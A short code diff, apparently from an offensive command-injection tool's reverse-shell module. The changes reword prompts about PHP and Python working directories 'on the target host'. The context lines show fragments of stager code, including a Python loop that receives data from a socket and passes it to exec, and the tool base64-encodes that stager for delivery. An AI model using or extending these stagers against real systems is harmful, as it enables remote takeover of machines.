@@ -185,7 +185,7 @@ case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgs
         print ""
         while True:
           question_msg = "Do you want to use '" + settings.WIN_PHP_DIR 
-          question_msg += "' as PHP working directory? [Y/n] > "
+          question_msg += "' as PHP working directory on the target host? [Y/n] > "
           sys.stdout.write(settings.print_question_msg(question_msg))
           php_dir = sys.stdin.readline().replace("\n","").lower()
           if php_dir in settings.CHOICE_YES:
@@ -219,11 +219,11 @@ while len(d)!=l:
   d+=s.recv(4096)
 exec(d,{'s':s})"""      
       other_shell = base64.b64encode(other_shell)
-      if settings.TARGET_OS == "win": 
+      if settings.TARGET_OS == "win" and not settings.USER_DEFINED_PYTHON_DIR: 
         print ""
         while True:
           question_msg = "Do you want to use '" + settings.WIN_PYTHON_DIR 
-          question_msg += "' as Python working directory? [Y/n] > "
+          question_msg += "' as Python working directory on the target host? [Y/n] > "
           sys.stdout.write(settings.print_question_msg(question_msg))
           python_dir = sys.stdin.readline().replace("\n","").lower()
           if python_dir in settings.CHOICE_YES:
